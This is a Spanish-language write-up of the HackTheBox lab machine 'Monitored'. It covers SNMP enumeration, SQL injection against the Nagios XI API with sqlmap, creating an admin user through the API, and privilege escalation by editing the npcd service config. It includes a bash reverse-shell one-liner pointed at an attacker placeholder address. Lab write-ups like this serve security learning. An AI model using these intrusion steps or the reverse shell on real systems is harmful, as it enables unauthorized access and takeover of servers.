--- 
title: "Monitored" 
platform: "Hackthebox"
date: "2026-02-27" 
difficulty: "Medium" 
os: "linux" 
description: "Resolución de la máquina Analysis de HackTheBox." 
---

--------

Hacemos un escaneo de los puertos de la maquina:
![[Pasted image 20240114191726.png]]
Lanzamos un escaneo para ver la version y servicio que corren en estos puertos:
![[Pasted image 20240114192027.png]]
Nos metemos a launchpad para comprobar la versión del sistema que corre y nos da la siguiente información:
![[Pasted image 20240114192446.png]]
Vemos que hay un posible Remote Code Execution a través del ssh-agent.
También vemos que se corre por un puerto tcpwrapper es un servicio para controlar el acceso a la red.
![[Pasted image 20240114194519.png]]

Por ahora vamos a dejar esto de lado y vamos a interceptar la peticion de cuando se carga la pagina: 
![[Pasted image 20240114200321.png]]
Vamos a intentar hacer pruebas de LFI, de momento no llegamos a ningún resultado, por lo que vamos a fuzzear por si encontramos algún directorio, no nos sirve da nada todas estas pruebas por lo que hemos hecho un escaneo por UDP, y encontramos un servicio snmp abierto con este probamos hacer un escaneo, para ver información del sistema, ya que es la version antigua de snmp y si conocemos la community-key establecida podremos hacer escaneos del sistema que nos de procesos y demas, hay pocas community-keys asi que es facil fuzzearlas normalmente es public como es en nuestro caso toda la informacion de como escanearlo lo hemos sacado de hachtricks: https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp
![[Pasted image 20240115021358.png]]Probamos a conectarnos en la ruta https://nagios.monitored.htb/nagios/:
![[Pasted image 20240115030250.png]]
Vale hemos investigado y hemos visto que se puede habilitar en esta versión un login inseguro con este link hemos conseguido habilitarlo:https://support.nagios.com/forum/viewtopic.php?f=16&t=58783
Lo habilitamos y creamos un token:
![[Pasted image 20240116032830.png]]
Investigando encontramos lo siguiente:https://vuldb.com/?id.239985
Una inyección SQL para esta versión de nagios en la ruta de la api: 
![[Pasted image 20240116033339.png]]
En el campo id hay varias opciones de inyección SQL, bastante complicadas asi que opte por SQL-MAP, soy un loser todavía jajaajaj:
![[Pasted image 20240116033459.png]]
Tengo que investigar sobre ellas todavía.
sqlmap nos devuelve los siguientes datos:
![[Pasted image 20240116033945.png]]
>Por lo que tenemos la api_token del usuario administrador.

Con la api_token del admin podemos crear usarios utilizando el endpoint de la API:![[Pasted image 20240116034624.png]]
Creamos el usuario toni:toni123:

![[Pasted image 20240116034606.png]]
Y nos conectamos con privilegio de administrador a Nagios XI:
![[Pasted image 20240116034804.png]]

Explorando la web hemos encontrado una parte para crear comandos:
![[Pasted image 20240116013708.png]]
Ahora creamos uno que ejecute un comando que nos mande una reverse shell al puerto que estemos en escucha:
**Nota corrigiendo el comando que queremos ejecutar para establecernos la reverse shell**

	bash -c 'bash -i >& /dev/tcp/ipatacante/portattack 0>&1'
	

![[Pasted image 20240116014547.png]]Cuando lo guardemos tenemos que ejecutarlo en la parte de monitoreo de comandos:
![[Pasted image 20240116014742.png]]
Mientras estamos en escucha:
![[Pasted image 20240116020727.png]]
Ahora lo que vamos hacer es escalar privilegios para convertirnos en root:
![[Pasted image 20240116020819.png]]
Como podemos ver podemos sin ofrecer contraseña parar el servicio npcd, y arrancarlo como root, al igual que nagios, tambien tenemos varios scripts en bash que nos pueden ser util si nos dejasen escribir en ellos que no es el caso, vamos a probar a ejecutarlos:
![[Pasted image 20240116021552.png]]
Este script parece que nos deja manejar los servicios que nos muestra la ayuda por pantalla, vamos a ver si podemos leerlo, no coge ninguna ruta especial de carga de los servicios por lo que vamos a probar es haber si podemos modificar el fichero de configuración de npcd:
![[Pasted image 20240116022114.png]]
Vemos que tenemos permiso de escritura en el archivo de configuración de npcd, por lo que vamos a editarle y añadir la siguiente linea:
![[Pasted image 20240116031020.png]]
Le editamos y borramos todo y añadimos esas líneas para ejecutarnos la reverse shell, cuando el servicio se reinicie:
![[Pasted image 20240116031228.png]]

Por donde estábamos en escucha hemos recibido una bash:

![[Pasted image 20240116031259.png]]
Y sacamos la root.txt:
![[Pasted image 20240116031402.png]]